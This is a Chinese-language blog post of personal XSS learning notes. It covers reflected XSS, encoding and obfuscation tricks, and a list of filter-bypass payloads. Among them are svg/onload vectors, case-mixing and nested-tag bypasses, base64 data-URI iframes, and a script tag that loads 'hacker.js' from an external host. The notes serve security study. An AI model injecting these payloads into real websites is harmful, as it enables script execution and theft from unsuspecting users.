---
layout: post
title: "XSS Learning Notes"
subtitle: "XSS Learning Notes"
date: 2019-01-12
author: ppbibo
category: security
finished: true
---
[TOC]

XSS 又叫CSS (Cross Site Script) , 跨站脚本攻击.

它指的是恶意攻击者往WEB页面插入恶意html代码.

当用户浏览该页面时，嵌入WEB页面的html代码会被运行，从而达到恶意攻击用户的特殊目的.



## 一个普通反射型的xss

```
# name 参数未进行任何处理并打印

http://localhost/xxxxxxxssssssssssss/xss.php?name=<script>alert(1)</script>
```



## HTML编码

```
http://    ==   
&#104;&#116;&#116;&#112;&#58;&#47;&#47;   ==   
&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;

# 这三个是标签是相等的  都是 http://

# Hex 是十六进制编码
# Dec 是十进制编码
# 这种编码在html执行的前提是 ，必须在值里； 例如
# <a href=”xxx”>
# <img src=”xxx”>
```

## Unicode 编码

```
# Js中是允许使用 unicode编码的，

<  ==  “\x3c” == “\u003c”

>  ==  “\x3e” == “\u003e”

空格 == “\x20” == ” \u0020”

.....
```

## CSS编码

```
使用 Unicode 写中文字体名称，浏览器是可以正确的解析的。
例如：font-family: "\5FAE\8F6F\96C5\9ED1"，表示设置字体为“微软雅黑”
CSS 中 expression 用来把CSS属性和Javascript表达式关联起来

<img src="URL" style='Xss:expression(alert(/xss/));'>
 
但是这种的只能在IE6 , IE7 中才会触发。
```

## 宽字节

```
# Gbxxx系列编码
# %aa将%27吞并组成一个gbxxx字符 ==>  猏’


%aa%27 | alert(1)//
```

## eval(string) 函数

```
# 函数可计算某个字符串，并执行其中的的 JavaScript 代码,例如:

eval('alert(1)')
```

## fromcharcode() 函数

```
# 可接受指定的unicode编码的值，返回字符串，可以配合eval函数使用,例如
alert(1) ==> String.fromCharCode(97,108,101,114,116,40,49,41)

# 结合 eval 如下：

eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

## 伪协议

```
Javascript:alert(document.domain) 

data:text/html,<script>alert(1)</script> 

data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== 

vbscript: xxxx 			// IE中运行
```

## URL编码

```
%0a  //  URL换行符  
%20  //  空格

! %21 
" %22 
# %23 
$ %24 
% %25 
& %26 
' %27 
( %28 
) %29 
* %2A 
+ %2B 
......
```

## JS 多行字符串

```
Var a=’\

Test\

En\

//coding\

Aaa’

# *** JS特性 *** 
# & 比 = 优先级高
# == 比 & 优先级高




# Javascript 是从上到下按顺序执行的 
test()
function test(){
//code...   这种形式定义的函数会被优先解析
}  
 
# 实际解析顺序
function test(){
//code...   这种形式定义的函数会被优先解析
} 
test()
```

## 注释符

```
//     		# js注释

<!-- -->   	# HTML注释

/**/   		# js注释
```

## 常用绕过

```
<svg/onload=prompt(1);>  	// 短的xss_payload

<q/oncut=open()>           // 短的xss_payload

<q/oncut=alert(1)>			// 短的xss_payload

<scrip<script>t>alealertr(1)</scrip<script>t>   // 过滤不严

<ScriPt>alErT(1)</sCripT>     // 大小写绕过

<script>prompt(1);</script>   // 过滤alert 情况下

<script src="https://6o9.im/hacker.js"></script>

<div onclick="alert('xss')">  // 点击它后会触发

<div onmouseenter="alert('xss')">  // 用户鼠标移动到 div 上时会触发

<iframesrc="javascript:alert(2)">

<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">

<%0ascript>alert(1);</script> 	// 语法 BUG
```